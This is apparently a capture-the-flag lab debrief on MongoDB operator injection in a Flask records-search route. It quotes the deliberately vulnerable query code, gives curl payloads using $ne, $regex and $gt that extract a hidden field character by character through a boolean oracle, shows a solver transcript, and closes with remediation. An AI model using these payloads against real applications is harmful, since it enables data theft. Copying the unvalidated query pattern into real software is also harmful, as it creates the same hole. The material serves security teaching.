# Basic Records Room — Debrief

**Node:** `p4_1` &middot; **Flag:** `SEIYAKU{operators_not_strings}` &middot; **Route:** `GET/POST /p4/records` &middot; **Sink:** `challenges/phase4.py`, MongoDB (`records` collection) &middot; **Signal:** boolean-ish (`matched: true/false`, plus a bare count)

## MongoDB / MQL basics, briefly

MongoDB stores documents (roughly: JSON objects) in collections, and
its query language (MQL) describes a filter as a native data structure
— a Python `dict`, or a JSON object — not a string of syntax you write
and a parser reads. `db.records.find({"subject": "foo"})` says "find
documents where `subject` equals the string `"foo"`". That's an
**equality match**: it works because the value on the right-hand side
is a plain string.

MQL also defines a family of **query operators** — keys that start
with `$` — that change what "match" means for a field:

- `$regex` — the field's value matches a regular expression.
- `$gt` / `$lt` / `$gte` / `$lte` — the field's value is greater/less
  than (lexicographically, for strings) a given value.
- `$ne` — the field's value is not equal to a given value.
- `$exists` — the field is present (or absent) on the document at all.

You invoke one of these by passing a *dict* as the value instead of a
literal: `db.records.find({"subject": {"$regex": "^Restricted"}})`
means "find documents where `subject` starts with `Restricted`" — a
completely different query shape than the equality match above, even
though both are, structurally, "a value under the `subject` key".
**MongoDB decides how to interpret that value purely from its type**:
a string is a literal to compare against; a dict is a set of operators
to apply. There is no escaping, no quoting, no syntax to break out of
— just two different data shapes reaching the same interpreter, which
treats each one differently by design.

## Root cause

The route builds its query directly from request-supplied `field` and
`value`, with no check on what type `value` actually is before it
becomes part of a MongoDB filter:

```python
# challenges/phase4.py
if field and value is not None:
    db = mongo_db()
    try:
        # VULN: `field` and `value` reach MongoDB's query language
        # completely unvalidated — there is no isinstance(value, str)
        # (or any other type) check anywhere before this line.
        query = {field: value}
        count = db.records.count_documents(query)
        matched = count > 0
```

An ordinary caller sends a flat string — `?field=subject&value=foo` —
and `value` really is the Python string `"foo"` by the time it reaches
this line, so `query` becomes `{"subject": "foo"}`: an ordinary
equality match, exactly what the search box's own form ever sends.

The bug is what happens when `value` arrives as a `dict` instead. This
route accepts that shape two different ways, both real:

1. **A JSON body.** `POST /p4/records` with
   `{"field": "archive_key", "value": {"$regex": "^SEIYAKU"}}` —
   `request.get_json()` runs standard `json.loads` under the hood, so a
   nested JSON object is already a native Python `dict` the instant the
   body is parsed. Nothing app-specific happens here at all; this is
   just what `json.loads` does with nested objects.
2. **A bracket-notation query string.** Flask/Werkzeug does *not*
   auto-nest `value[$regex]=^adm` into a dict the way some other
   frameworks or query-string libraries do — `request.args` just hands
   back the literal key `"value[$regex]"`. This route reconstructs the
   nested shape itself:

   ```python
   # challenges/phase4.py
   def _bracket_value(args) -> dict | None:
       nested: dict = {}
       for key in args:
           if key.startswith("value[") and key.endswith("]"):
               op = key[len("value[") : -1]
               nested[op] = args.get(key)
       return nested or None
   ```

   That's genuine, working code, not a simulation of the bug — a real
   `GET` request with a key literally named `value[$regex]` on the wire
   produces a real Python `dict` by the time it reaches `query =
   {field: value}`.

Either way, once `value` is a dict, `query = {field: value}` builds
something like `{"archive_key": {"$regex": "^SEIYAKU"}}` — and MongoDB
honors it as a live operator, exactly as if the application's own code
had written that filter on purpose.

## The walk: hand-crafting the payloads

All of the following are real, live requests against this exact seed
(`seed/mongo/init_p4_flag.js` adds one `records` document,
`recordId: "REC-0006"`, carrying the flag under `archive_key` — a field
name given directly in `CHALLENGER.md`, since guessing schema field
names isn't this lesson's teaching point; extracting the *value* via
type confusion is).

### Step 0 — confirm the type confusion is real

A plain string search against a field whose value we already know from
the seed (`subject` on the public "Restricted Exam Incident Reports"
record):

```bash
curl -s -G "http://localhost:8000/p4/records" \
    --data-urlencode "field=subject" \
    --data-urlencode "value=Restricted Exam Incident Reports" \
    -H "Accept: application/json"
```

```json
{"count":1,"field":"subject","matched":true}
```

Now the same field, but with `value` sent as a dict (`$ne` against an
impossible string). If the app were safely stringifying non-string
input, this would never match — a dict literally isn't equal to any
real `subject` string. Instead:

```bash
curl -s -G "http://localhost:8000/p4/records" \
    --data-urlencode "field=subject" \
    --data-urlencode "value[\$ne]=nonexistent" \
    -H "Accept: application/json"
```

```json
{"count":6,"field":"subject","matched":true}
```

`count: 6` — matching every document that *has* a `subject` field and
isn't literally the string `"nonexistent"` (all 6 `records` documents,
including the hidden one). That's the proof: MongoDB is evaluating
`{"$ne": "nonexistent"}` as a real operator, not comparing the dict
itself against anything.

### Step 1 — confirm the hidden field and its prefix

```bash
curl -s -G "http://localhost:8000/p4/records" \
    --data-urlencode "field=archive_key" \
    --data-urlencode "value[\$regex]=^SEIYAKU" \
    -H "Accept: application/json"
```

```json
{"count":1,"field":"archive_key","matched":true}
```

One document has `archive_key`, and it starts with `SEIYAKU` — the
flag prefix every node in this lab shares.

### Step 2 — binary-search the length via `$regex`

`^.{1,N}$` matches a string whose *total* length is between 1 and `N`.
Binary-searching `N` finds the exact length in `O(log(max_len))`
requests instead of trying every length one at a time:

```bash
curl -s -G "http://localhost:8000/p4/records" \
    --data-urlencode "field=archive_key" \
    --data-urlencode 'value[$regex]=^.{1,30}$' \
    -H "Accept: application/json"
# {"count":1,"field":"archive_key","matched":true}   -> length <= 30

curl -s -G "http://localhost:8000/p4/records" \
    --data-urlencode "field=archive_key" \
    --data-urlencode 'value[$regex]=^.{1,29}$' \
    -H "Accept: application/json"
# {"count":0,"field":"archive_key","matched":false}  -> length > 29
```

`solvers/p4_1.py`'s live run against this exact seed converged on
`LENGTH(archive_key) = 30` in 6 requests (see its full transcript
below).

### Step 3 — walk the value char-by-char via `$regex`

For each position, anchor the already-known prefix and bisect the next
character's ASCII code using a regex **character class range**, e.g.
`^SEIYAKU\{o[a-m]` (does the 9th character fall in `a`-`m`?) vs.
`^SEIYAKU\{o[n-z]` (or `~`). This is exactly the same binary-search
shape as p1_5's `ASCII(SUBSTRING(...))` walk against MariaDB — here the
"substring" primitive is a regex anchor on a known prefix, and the
"ASCII compare" primitive is a regex character class over an ASCII
range, instead of SQL functions:

```bash
curl -s -G "http://localhost:8000/p4/records" \
    --data-urlencode "field=archive_key" \
    --data-urlencode 'value[$regex]=^SEIYAKU\{o' \
    -H "Accept: application/json"
```

```json
{"count":1,"field":"archive_key","matched":true}
```

### Step 4 — cross-validate with a completely different operator

Once the walk recovers a candidate value, `$gt`/`$lt`/`$eq` bracketing
against that exact string is an independent check — a different
operator family entirely, with no shared code path to the `$regex`
walk that found it:

```bash
curl -s -G "http://localhost:8000/p4/records" \
    --data-urlencode "field=archive_key" \
    --data-urlencode 'value[$gt]=SEIYAKU{n' \
    -H "Accept: application/json"
```

```json
{"count":1,"field":"archive_key","matched":true}
```

### The JSON-body variant, for completeness

The same query, sent as a native nested JSON body instead of
bracket-notation query-string keys — no app-side reconstruction needed
here at all, since `json.loads` already produces a real `dict`:

```bash
curl -s -X POST "http://localhost:8000/p4/records" \
    -H "Content-Type: application/json" \
    -d '{"field":"archive_key","value":{"$regex":"^SEIYAKU"}}'
```

```json
{"count":1,"field":"archive_key","matched":true}
```

### Full live extraction

`solvers/p4_1.py` automates all four steps above against the real
route and the real seeded MongoDB — no hardcoded or simulated values
except the final assertion. A real run against this exact seed:

```
[p4_1] target: http://localhost:8000/p4/records
[p4_1] step 0 — confirm the search oracle + real type confusion
  subject='Restricted Exam Incident Reports' (plain string) -> matched=True
  subject='definitely-not-a-real-subject-xyz' -> matched=False
  subject[$ne]='definitely-not-a-real-subject-xyz' -> matched=True
  subject[$regex]='^Restricted' -> matched=True
  ok: dict-valued `value` genuinely reaches MongoDB as query operators
[p4_1] step 1 — confirm hidden field 'archive_key' exists and starts with SEIYAKU
  archive_key[$regex]='^SEIYAKU' -> matched=True
  ok: hidden field exists and is reachable via $regex
[p4_1] step 2 — binary-search LENGTH(archive_key) via $regex
  len<=32? -> True
  len<=16? -> False
  len<=24? -> False
  len<=28? -> False
  len<=30? -> True
  len<=29? -> False
  ok: LENGTH(archive_key) = 30
[p4_1] step 3 — walk archive_key char-by-char via $regex character-class bisection
  position  1: 'S'  (so far: 'S')
  position  2: 'E'  (so far: 'SE')
  ...
  position 29: 's'  (so far: 'SEIYAKU{operators_not_strings')
  position 30: '}'  (so far: 'SEIYAKU{operators_not_strings}')
[p4_1] step 4 — cross-validate recovered value via $gt/$lt/$eq bracketing
  archive_key[$eq]='SEIYAKU{operators_not_strings}' -> matched=True
  archive_key[$gt]='SEIYAKU{operators_not_strings|' -> matched=True
  archive_key[$lt]='SEIYAKU{operators_not_strings~' -> matched=True
  ok: $eq / $gt / $lt all independently agree with the $regex-recovered value
[p4_1] recovered value: SEIYAKU{operators_not_strings}
  ok: recovered flag matches: SEIYAKU{operators_not_strings}
[p4_1] PASS
```

Wall-clock time for the entire walk (confirmed live): **~2 seconds** —
each request is an ordinary local HTTP round trip with no artificial
delay; the oracle here is boolean-blind, not time-blind, so there's no
`SLEEP()`-style cost the way there was for p1_5.

## HxH analogy

Manipulation, as a Nen category, is built around making something act
on your behalf without it ever announcing that anything unusual
happened. The clerk staffing this floor's search counter isn't
lying to you and isn't broken — it answers every question exactly the
way it's designed to, faithfully, every single time. The bug isn't
that the clerk misbehaves. It's that the clerk was never told to check
*what kind of question* it was being asked before forwarding it,
word-for-word, to the archive's own indexing system — and that system
speaks a language where a plain word and a live instruction can look,
structurally, like the same kind of thing arriving at the same
counter. You never had to trick the clerk into doing something it
wasn't built to do. You only had to hand it a request shaped slightly
differently than the one it expected, and let it do exactly its job.

## Remediation

- **Validate the type of every value before it reaches a query,
  always.** This is the actual fix, and it's a one-line check:

  ```python
  if not isinstance(value, str):
      abort(400, "value must be a string")
  ```

  placed before `query = {field: value}` closes this exact
  vulnerability outright — a dict can never reach `find()`/
  `count_documents()` as an operator if it's rejected before it gets
  that far. The same discipline applies to `field`: an allowlist of
  legitimate, intentionally-searchable field names (rather than
  accepting any key a caller supplies) closes the smaller, secondary
  issue of a caller being able to probe arbitrary field names on a
  document at all.
- **Use a schema-validation layer at the API boundary** (e.g. a
  Pydantic model, a JSON-schema validator, or Flask-side request
  parsing that declares expected types) rather than trusting whatever
  shape `request.args`/`request.get_json()` happens to hand back. Most
  of these tools reject a dict where a string was declared, by
  construction — turning "remember to check every input everywhere"
  into "the framework enforces it by default."
- **Least-privilege database accounts and field-level access control**,
  same principle as every floor in this lab: even with the type check
  in place, a route's own MongoDB user should only be able to read the
  fields/collections that route legitimately needs, so a future bug of
  this same shape elsewhere in the app can't reach `archive_key` (or
  anything else) it was never meant to touch.
- **Never assume a query language without string syntax is immune to
  injection.** The lesson generalizes beyond MongoDB: any interface
  that builds a structured query (or command, or filter) out of a
  native data structure — ORMs with dict-based `.filter(**kwargs)`
  helpers, GraphQL resolvers, template engines that accept structured
  input — has the same class of bug available to it the moment
  attacker-controlled data reaches that structure without a type check
  first. There's no quote to escape here, and no quote-escaping fix
  would have helped; the fix is about what *type* of value reaches the
  query, not what characters it contains.
